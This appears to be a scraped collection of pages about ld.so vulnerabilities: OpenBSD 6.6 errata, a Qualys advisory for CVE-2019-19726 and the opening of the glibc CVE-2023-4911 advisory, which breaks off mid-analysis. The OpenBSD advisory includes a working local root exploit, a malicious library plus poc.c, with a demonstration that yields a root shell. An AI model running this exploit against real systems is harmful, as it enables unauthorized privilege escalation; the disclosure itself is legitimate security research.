=== Content from packetstormsecurity.com_02d4a966_20250120_232830.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from www.openbsd.org_224d38a5_20250120_232834.html ===


OpenBSD 6.6 Errata

## [*Open***BSD**](index.html) 6.6 Errata

---

For errata on a certain release, click below:

[2.0](errata20.html),
[2.1](errata21.html),
[2.2](errata22.html),
[2.3](errata23.html),
[2.4](errata24.html),
[2.5](errata25.html),
[2.6](errata26.html),
[2.7](errata27.html),
[2.8](errata28.html),
[2.9](errata29.html),
[3.0](errata30.html),
[3.1](errata31.html),
[3.2](errata32.html),
[3.3](errata33.html),
[3.4](errata34.html),
[3.5](errata35.html),

[3.6](errata36.html),
[3.7](errata37.html),
[3.8](errata38.html),
[3.9](errata39.html),
[4.0](errata40.html),
[4.1](errata41.html),
[4.2](errata42.html),
[4.3](errata43.html),
[4.4](errata44.html),
[4.5](errata45.html),
[4.6](errata46.html),
[4.7](errata47.html),
[4.8](errata48.html),
[4.9](errata49.html),
[5.0](errata50.html),
[5.1](errata51.html),

[5.2](errata52.html),
[5.3](errata53.html),
[5.4](errata54.html),
[5.5](errata55.html),
[5.6](errata56.html),
[5.7](errata57.html),
[5.8](errata58.html),
[5.9](errata59.html),
[6.0](errata60.html),
[6.1](errata61.html),
[6.2](errata62.html),
[6.3](errata63.html),
[6.4](errata64.html),
[6.5](errata65.html),
[6.7](errata67.html),
[6.8](errata68.html),

[6.9](errata69.html),
[7.0](errata70.html),
[7.1](errata71.html),
[7.2](errata72.html),
[7.3](errata73.html),
[7.4](errata74.html),
[7.5](errata75.html),
[7.6](errata76.html).

---

Patches for the OpenBSD base system are distributed as unified diffs.
Each patch is cryptographically signed with the
[signify(1)](https://man.openbsd.org/OpenBSD-6.6/signify.1) tool and contains
usage instructions.
All the following patches are also available in one
[tar.gz file](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6.tar.gz)
for convenience.

Alternatively, the [syspatch(8)](https://man.openbsd.org/syspatch)
utility can be used to apply binary updates on the following architectures:
amd64, i386, arm64.

Patches for supported releases are also incorporated into the
[-stable branch](stable.html).

---

* **001: RELIABILITY FIX: October 28, 2019**
    *All architectures*

  bpf(4) has a race condition during device removal.

  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/001_bpf.patch.sig)

  * **002: RELIABILITY FIX: October 28, 2019**
      *All architectures*

    Various third party applications may crash due to symbol collision.

    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/002_ber.patch.sig)

    * **003: RELIABILITY FIX: October 31, 2019**
        *All architectures*

      bgpd(8) can crash on nexthop changes or during startup in certain
      configurations.

      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/003_bgpd.patch.sig)

      * **004: RELIABILITY FIX: November 16, 2019**
          *All architectures*

        The kernel could crash due to a NULL pointer dereference in net80211.

        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/004_net80211.patch.sig)

        * **005: RELIABILITY FIX: November 16, 2019**
            *All architectures*

          A new kernel may require newer firmware images when using sysupgrade.

          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/005_sysupgrade.patch.sig)

          * **006: SECURITY FIX: November 16, 2019**
              *All architectures*

            A regular user could change some network interface parameters due
            to missing checks in the ioctl(2) system call.

            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/006_ifioctl.patch.sig)

            * **007: SECURITY FIX: November 22, 2019**
                *i386 and amd64*

              A local user could cause the system to hang by reading specific
              registers when Intel Gen8/Gen9 graphics hardware is in a low power state.
              A local user could perform writes to memory that should be blocked with
              Intel Gen9 graphics hardware.

              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/007_inteldrm.patch.sig)

              * **008: SECURITY FIX: November 22, 2019**
                  *All architectures*

                Shared memory regions used by some Mesa drivers had permissions which
                allowed others to access that memory.

                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/008_mesa.patch.sig)

                * **009: SECURITY FIX: December 4, 2019**
                    *All architectures*

                  Environment-provided paths are used for dlopen() in mesa, resulting in
                  escalation to the auth group in xlock(1).

                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/009_mesaxlock.patch.sig)

                  * **010: SECURITY FIX: December 4, 2019**
                      *All architectures*

                    libc's authentication layer performed insufficient username validation.

                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/010_libcauth.patch.sig)

                    * **011: SECURITY FIX: December 4, 2019**
                        *All architectures*

                      xenodm uses the libc authentication layer incorrectly.

                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/011_xenodm.patch.sig)

                      * **012: SECURITY FIX: December 8, 2019**
                          *All architectures*

                        A user can log in with a different user's login class.

                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/012_suauth.patch.sig)

                        * **013: SECURITY FIX: December 11, 2019**
                            *All architectures*

                          ld.so may fail to remove the LD\_LIBRARY\_PATH environment variable for
                          set-user-ID and set-group-ID executables in low memory conditions.

                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/013_ldso.patch.sig)

                          * **014: SECURITY FIX: December 18, 2019**
                              *arm64*

                            ARM64 CPUs speculatively execute instructions after ERET.

                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/014_eret.patch.sig)

                            * **015: SECURITY FIX: December 20, 2019**
                                *All architectures*

                              ftp(1) will follow remote redirects to local files.

                              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/015_ftp.patch.sig)

                              * **016: SECURITY FIX: December 20, 2019**
                                  *All architectures*

                                ripd(8) fails to validate authentication lengths.

                                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/016_ripd.patch.sig)

                                * **017: SECURITY FIX: January 17, 2020**
                                    *i386 and amd64*

                                  Execution Unit state was not cleared on context switch with Intel Gen9
                                  graphics hardware.

                                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/017_inteldrmctx.patch.sig)

                                  * **018: RELIABILITY FIX: January 30, 2020**
                                      *All architectures*

                                    smtpd can crash on opportunistic TLS downgrade, causing a denial of service.

                                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/018_smtpd_tls.patch.sig)

                                    * **019: SECURITY FIX: January 30, 2020**
                                        *All architectures*

                                      An incorrect check allows an attacker to trick mbox delivery into executing
                                      arbitrary commands as root and lmtp delivery into executing arbitrary commands
                                      as an unprivileged user.

                                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/019_smtpd_exec.patch.sig)

                                      * **020: SECURITY FIX: February 17, 2020**
                                          *amd64*

                                        A missing range check in the vmm pvclock allows a guest to write
                                        to host memory.

                                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/020_vmm_pvclock.patch.sig)

                                        * **021: SECURITY FIX: February 24, 2020**
                                            *All architectures*

                                          An out of bounds read in smtpd allows an attacker to inject arbitrary
                                          commands into the envelope file which are then executed as root.
                                          Separately, missing privilege revocation in smtpctl allows arbitrary
                                          commands to be run with the \_smtpq group.

                                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/021_smtpd_envelope.patch.sig)

                                          * **022: RELIABILITY FIX: March 10, 2020**
                                              *All architectures*

                                            Missing input validation in sysctl(2) can be used to crash the kernel.

                                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/022_sysctl.patch.sig)

                                            * **023: RELIABILITY FIX: March 13, 2020**
                                                *All architectures*

                                              Local outbound UDP broadcast or multicast packets sent by a spliced
                                              socket can crash the kernel.

                                              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/023_sosplice.patch.sig)

                                              * **024: SECURITY FIX: April 7, 2020**
                                                  *All architectures*

                                                dhcpd could reference freed memory after releasing a lease with an
                                                unusually long uid.

                                                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/024_dhcpd.patch.sig)

                                                * **025: SECURITY FIX: April 19, 2020**
                                                    *i386, amd64, arm64, loongson, macppc, sparc64*

                                                  There was an incorrect test for root in the DRM Linux compatibility code.

                                                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/025_drm.patch.sig)

                                                  * **026: RELIABILITY FIX: May 10, 2020**
                                                      *All architectures*

                                                    ospfd could generate corrupt OSPF Router (Type 1) LSAs in certain situations.

                                                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/026_ospfd_lsa.patch.sig)

                                                    * **027: SECURITY FIX: May 13, 2020**
                                                        *All architectures*

                                                      An out-of-bounds index access in wscons(4) can cause a kernel crash.

                                                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/027_wscons.patch.sig)

                                                      * **028: SECURITY FIX: May 22, 2020**
                                                          *All architectures*

                                                        Specially crafted queries may crash unbound and unwind.
                                                        Both can be tricked into amplifying an incoming query.

                                                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/028_unbound.patch.sig)

                                                        * **029: SECURITY FIX: June 1, 2020**
                                                            *All architectures*

                                                          Several problems in Perl's regular expression compiler could lead to
                                                          corruption of the intermediate language state of a compiled regular
                                                          expression.

                                                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/029_perl.patch.sig)

                                                          * **030: SECURITY FIX: June 5, 2020**
                                                              *All architectures*

                                                            Malicious HID descriptors could be misparsed.

                                                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/030_hid.patch.sig)

                                                            * **031: RELIABILITY FIX: June 8, 2020**
                                                                *All architectures*

                                                              libc's resolver could get into a corrupted state.

                                                              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/031_asr.patch.sig)

                                                              * **032: RELIABILITY FIX: June 11, 2020**
                                                                  *All architectures*

                                                                libcrypto may fail to build a valid certificate chain due to
                                                                expired untrusted issuer certificates.

                                                                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/032_x509.patch.sig)

                                                                * **033: SECURITY FIX: July 9, 2020**
                                                                    *All architectures*

                                                                  shmget IPC\_STAT leaked some kernel data.

                                                                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/033_shmget.patch.sig)

                                                                  * **034: RELIABILITY FIX: July 16, 2020**
                                                                      *All architectures*

                                                                    tty subsystem abuse can impact performance badly.

                                                                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/034_tty.patch.sig)

                                                                    * **035: RELIABILITY FIX: July 22, 2020**
                                                                        *All architectures*

                                                                      Only pty devices need reprint delays.

                                                                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/035_tty.patch.sig)

                                                                      * **036: SECURITY FIX: July 27, 2020**
                                                                          *All architectures*

                                                                        In iked, incorrect use of EVP\_PKEY\_cmp allows an authentication bypass.

                                                                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/036_iked.patch.sig)

                                                                        * **037: SECURITY FIX: July 31, 2020**
                                                                            *All architectures*

                                                                          Malformed messages can cause heap corruption in the X Input Method
                                                                          client implementation in libX11.

                                                                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/037_ximcp.patch.sig)

                                                                          * **038: SECURITY FIX: July 31, 2020**
                                                                              *All architectures*

                                                                            Pixmaps inside the xserver were an info leak.

                                                                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/038_dix.patch.sig)

                                                                            * **039: RELIABILITY FIX: August 7, 2020**
                                                                                *All architectures*

                                                                              The recent security errata 037 broke X11 input methods.

                                                                              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/039_ximcp.patch.sig)

                                                                              * **040: SECURITY FIX: August 25, 2020**
                                                                                  *All architectures*

                                                                                An integer overflow in libX11 could lead to a double free.
                                                                                Additionally fix a regression in ximcp.

                                                                                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/040_xinitom.patch.sig)

                                                                                * **041: SECURITY FIX: August 25, 2020**
                                                                                    *All architectures*

                                                                                  Various X server extensions had deficient input validation.

                                                                                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/041_xserverlen.patch.sig)

                                                                                  * **042: SECURITY FIX: September 5, 2020**
                                                                                      *amd64, arm64*

                                                                                    A buffer overflow was discovered in an amdgpu ioctl.

                                                                                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/042_amdgpu.patch.sig)

---



=== Content from seclists.org_ef567db4_20250120_232833.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

![](/shared/images/nst-icons.svg#search)

# Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)

---

*From*: Qualys Security Advisory <qsa () qualys com>

*Date*: Wed, 11 Dec 2019 21:24:41 +0000

---

```

Qualys Security Advisory

Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)

==============================================================================
Contents
==============================================================================

Summary
Analysis
Demonstration
Acknowledgments

==============================================================================
Summary
==============================================================================

We discovered a Local Privilege Escalation in OpenBSD's dynamic loader
(ld.so): this vulnerability is exploitable in the default installation
(via the set-user-ID executable chpass or passwd) and yields full root
privileges.

We developed a simple proof of concept and successfully tested it
against OpenBSD 6.6 (the current release), 6.5, 6.2, and 6.1, on both
amd64 and i386; other releases and architectures are probably also
exploitable.

==============================================================================
Analysis
==============================================================================

In this section, we analyze a step-by-step execution of our proof of
concept:

------------------------------------------------------------------------------

1/ We execve() the set-user-ID /usr/bin/chpass, but first:

   1a/ we set the LD_LIBRARY_PATH environment variable to one single dot
   (the current working directory) and approximately ARG_MAX colons (the
   maximum number of bytes for the argument and environment list); as
   described in man ld.so:

     LD_LIBRARY_PATH
             A colon separated list of directories, prepending the default
             search path for shared libraries.  This variable is ignored for
             set-user-ID and set-group-ID executables.

   1b/ we set the RLIMIT_DATA resource limit to ARG_MAX * sizeof(char *)
   (2MB on amd64, 1MB on i386); as described in man setrlimit:

     RLIMIT_DATA     The maximum size (in bytes) of the data segment for a
                     process; this includes memory allocated via malloc(3) and
                     all other anonymous memory mapped via mmap(2).

------------------------------------------------------------------------------

2/ Before the main() function of chpass is executed, the _dl_boot()
function of ld.so is executed and calls _dl_setup_env():

262 void
263 _dl_setup_env(const char *argv0, char **envp)
264 {
...
271         _dl_libpath = _dl_split_path(_dl_getenv("LD_LIBRARY_PATH", envp));
...
283         _dl_trust = !_dl_issetugid();
284         if (!_dl_trust) {       /* Zap paths if s[ug]id... */
285                 if (_dl_libpath) {
286                         _dl_free_path(_dl_libpath);
287                         _dl_libpath = NULL;
288                         _dl_unsetenv("LD_LIBRARY_PATH", envp);
289                 }

------------------------------------------------------------------------------

3/ At line 271, _dl_getenv() returns a pointer to our LD_LIBRARY_PATH
environment variable and passes it to _dl_split_path():

 23 char **
 24 _dl_split_path(const char *searchpath)
 25 {
 ..
 35         pp = searchpath;
 36         while (*pp) {
 37                 if (*pp == ':' || *pp == ';')
 38                         count++;
 39                 pp++;
 40         }
 ..
 45         retval = _dl_reallocarray(NULL, count, sizeof(*retval));
 46         if (retval == NULL)
 47                 return (NULL);

------------------------------------------------------------------------------

4/ At line 45, count is approximately ARG_MAX (the number of colons in
our LD_LIBRARY_PATH) and _dl_reallocarray() returns NULL (because of our
low RLIMIT_DATA); at line 47, _dl_split_path() returns NULL.

------------------------------------------------------------------------------

5/ As a result, _dl_libpath is NULL (line 271) and our LD_LIBRARY_PATH
is ignored, but it is not deleted from the environment (CVE-2019-19726):
although _dl_trust is false (_dl_issetugid() returns true because chpass
is set-user-ID), _dl_unsetenv() is not called (line 288) because
_dl_libpath is NULL (line 285).

------------------------------------------------------------------------------

6/ Next, the main() function of chpass is executed, and it:

   6a/ calls setuid(0), which sets the real and effective user IDs to 0;

   6b/ calls pw_init(), which resets RLIMIT_DATA to RLIM_INFINITY;

   6c/ calls pw_mkdb(), which vfork()s and execv()s /usr/sbin/pwd_mkdb
   (unlike execve(), execv() does not reset the environment).

------------------------------------------------------------------------------

7/ Before the main() function of pwd_mkdb is executed, the _dl_boot()
function of ld.so is executed and calls _dl_setup_env():

   7a/ at line 271, _dl_getenv() returns a pointer to our
   LD_LIBRARY_PATH environment variable (because it was not deleted from
   the environment in step 5, and because execv() did not reset the
   environment in step 6c);

   7b/ at line 45, _dl_reallocarray() does not return NULL anymore
   (because our low RLIMIT_DATA was reset in step 6b);

   7c/ as a result, _dl_libpath is not NULL (line 271), and it is not
   reset to NULL (line 287) because _dl_trust is true (_dl_issetugid()
   returns false because pwd_mkdb is not set-user-ID, and because the
   real and effective user IDs were both set to 0 in step 6a): our
   LD_LIBRARY_PATH is not ignored anymore.

------------------------------------------------------------------------------

8/ Finally, ld.so searches for shared libraries in _dl_libpath (our
LD_LIBRARY_PATH) and loads our own library from the current working
directory (the dot in our LD_LIBRARY_PATH).

------------------------------------------------------------------------------

==============================================================================
Demonstration
==============================================================================

In this section, we demonstrate the use of our proof of concept:

------------------------------------------------------------------------------

$ id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)

$ cd /tmp

$ cat > lib.c << "EOF"
#include <paths.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    if (setuid(0) != 0) _exit(__LINE__);
    if (setgid(0) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, "-c", _PATH_KSHELL "; exit 1", NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

$ readelf -a /usr/sbin/pwd_mkdb | grep NEEDED
 0x0000000000000001 (NEEDED)             Shared library: [libutil.so.13.1]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.95.1]

$ gcc -fpic -shared -s -o libutil.so.13.1 lib.c

$ cat > poc.c << "EOF"
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <unistd.h>

int
main(int argc, char * const * argv)
{
    #define LLP "LD_LIBRARY_PATH=."
    static char llp[ARG_MAX - 128];
    memset(llp, ':', sizeof(llp)-1);
    memcpy(llp, LLP, sizeof(LLP)-1);
    char * const envp[] = { llp, "EDITOR=echo '#' >>", NULL };

    #define DATA (ARG_MAX * sizeof(char *))
    const struct rlimit data = { DATA, DATA };
    if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);

    if (argc <= 1) _exit(__LINE__);
    argv += 1;
    execve(argv[0], argv, envp);
    _exit(__LINE__);
}
EOF

$ gcc -s -o poc poc.c

$ ./poc /usr/bin/chpass

# id
uid=0(root) gid=0(wheel) groups=32767(nobody)

------------------------------------------------------------------------------

==============================================================================
Acknowledgments
==============================================================================

We thank Theo de Raadt and the OpenBSD developers for their incredibly
quick response: they published a patch for this vulnerability in less
than 3 hours. We also thank MITRE's CVE Assignment Team.

[<https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png>]<<https://www.qualys.com/email-banner>>

This message may contain confidential and privileged information. If it has been sent to you in error, please reply to
advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read,
copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that
all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service
providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate
unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.

```

---

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

### Current thread:

* **Local Privilege Escalation in OpenBSD's dynamic loader (CVE-2019-19726)** *Qualys Security Advisory (Dec 12)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.openwall.com_20e35360_20250120_232833.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20231003175031.GA16924@localhost.localdomain>
Date: Tue, 3 Oct 2023 17:50:36 +0000
From: Qualys Security Advisory <qsa@...lys.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: CVE-2023-4911: Local Privilege Escalation in the glibc's ld.so

Qualys Security Advisory

Looney Tunables: Local Privilege Escalation in the glibc's ld.so
(CVE-2023-4911)

========================================================================
Contents
========================================================================

Summary
Analysis
Proof of concept
Exploitation
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

The GNU C Library's dynamic loader "find[s] and load[s] the shared
objects (shared libraries) needed by a program, prepare[s] the program
to run, and then run[s] it" (man ld.so). The dynamic loader is extremely
security sensitive, because its code runs with elevated privileges when
a local user executes a set-user-ID program, a set-group-ID program, or
a program with capabilities. Historically, the processing of environment
variables such as LD_PRELOAD, LD_AUDIT, and LD_LIBRARY_PATH has been a
fertile source of vulnerabilities in the dynamic loader.

Recently, we discovered a vulnerability (a buffer overflow) in the
dynamic loader's processing of the GLIBC_TUNABLES environment variable
(<https://www.gnu.org/software/libc/manual/html_node/Tunables.html>). This
vulnerability was introduced in April 2021 (glibc 2.34) by commit 2ed18c
("Fix SXID_ERASE behavior in setuid programs (BZ #27471)").

We successfully exploited this vulnerability and obtained full root
privileges on the default installations of Fedora 37 and 38, Ubuntu
22.04 and 23.04, Debian 12 and 13; other distributions are probably also
vulnerable and exploitable (one notable exception is Alpine Linux, which
uses musl libc, not the glibc). We will not publish our exploit for now;
however, this buffer overflow is easily exploitable (by transforming it
into a data-only attack), and other researchers might publish working
exploits shortly after this coordinated disclosure.

========================================================================
Analysis
========================================================================

At the very beginning of its execution, ld.so calls __tunables_init() to
walk through the environment (at line 279), searching for GLIBC_TUNABLES
variables (at line 282); for each GLIBC_TUNABLES that it finds, it makes
a copy of this variable (at line 284), calls parse_tunables() to process
and sanitize this copy (at line 286), and finally replaces the original
GLIBC_TUNABLES with this sanitized copy (at line 288):

------------------------------------------------------------------------
269 void
270 __tunables_init (char **envp)
271 {
272   char *envname = NULL;
273   char *envval = NULL;
274   size_t len = 0;
275   char **prev_envp = envp;
...
279   while ((envp = get_next_env (envp, &envname, &len, &envval,
280                                &prev_envp)) != NULL)
281     {
282       if (tunable_is_name ("GLIBC_TUNABLES", envname))
283         {
284           char *new_env = tunables_strdup (envname);
285           if (new_env != NULL)
286             parse_tunables (new_env + len + 1, envval);
287           /* Put in the updated envval.  */
288           *prev_envp = new_env;
289           continue;
290         }
------------------------------------------------------------------------

The first argument of parse_tunables() (tunestr) points to the
soon-to-be-sanitized copy of GLIBC_TUNABLES, while the second argument
(valstring) points to the original GLIBC_TUNABLES environment variable
(in the stack). To sanitize the copy of GLIBC_TUNABLES (which should be
of the form "tunable1=aaa:tunable2=bbb"), parse_tunables() removes all
dangerous tunables (the SXID_ERASE tunables) from tunestr, but keeps
SXID_IGNORE and NONE tunables (at lines 221-235):

------------------------------------------------------------------------
162 static void
163 parse_tunables (char *tunestr, char *valstring)
164 {
...
168   char *p = tunestr;
169   size_t off = 0;
170
171   while (true)
172     {
173       char *name = p;
174       size_t len = 0;
175
176       /* First, find where the name ends.  */
177       while (p[len] != '=' && p[len] != ':' && p[len] != '\0')
178         len++;
179
180       /* If we reach the end of the string before getting a valid name-value
181          pair, bail out.  */
182       if (p[len] == '\0')
183         {
184           if (__libc_enable_secure)
185             tunestr[off] = '\0';
186           return;
187         }
188
189       /* We did not find a valid name-value pair before encountering the
190          colon.  */
191       if (p[len]== ':')
192         {
193           p += len + 1;
194           continue;
195         }
196
197       p += len + 1;
198
199       /* Take the value from the valstring since we need to NULL terminate it.  */
200       char *value = &valstring[p - tunestr];
201       len = 0;
202
203       while (p[len] != ':' && p[len] != '\0')
204         len++;
205
206       /* Add the tunable if it exists.  */
207       for (size_t i = 0; i < sizeof (tunable_list) / sizeof (tunable_t); i++)
208         {
209           tunable_t *cur = &tunable_list[i];
210
211           if (tunable_is_name (cur->name, name))
212             {
...
219               if (__libc_enable_secure)
220                 {
221                   if (cur->security_level != TUNABLE_SECLEVEL_SXID_ERASE)
222                     {
223                       if (off > 0)
224                         tunestr[off++] = ':';
225
226                       const char *n = cur->name;
227
228                       while (*n != '\0')
229                         tunestr[off++] = *n++;
230
231                       tunestr[off++] = '=';
232
233                       for (size_t j = 0; j < len; j++)
234                         tunestr[off++] = value[j];
235                     }
236
237                   if (cur->security_level != TUNABLE_SECLEVEL_NONE)
238                     break;
239                 }
240
241               value[len] = '\0';
